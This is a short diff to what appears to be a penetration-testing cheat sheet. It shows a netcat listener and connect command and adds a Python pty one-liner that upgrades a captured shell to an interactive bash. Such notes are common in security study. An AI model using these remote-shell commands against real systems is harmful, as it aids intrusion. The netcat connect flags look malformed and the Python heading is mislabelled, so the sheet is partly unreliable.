@@ -28,3 +28,13 @@ nc -lvnp port
 ```sh
 nc -nc ip port
 ```
+
+---
+## Python
+---
+- Python Server
+```python
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+```
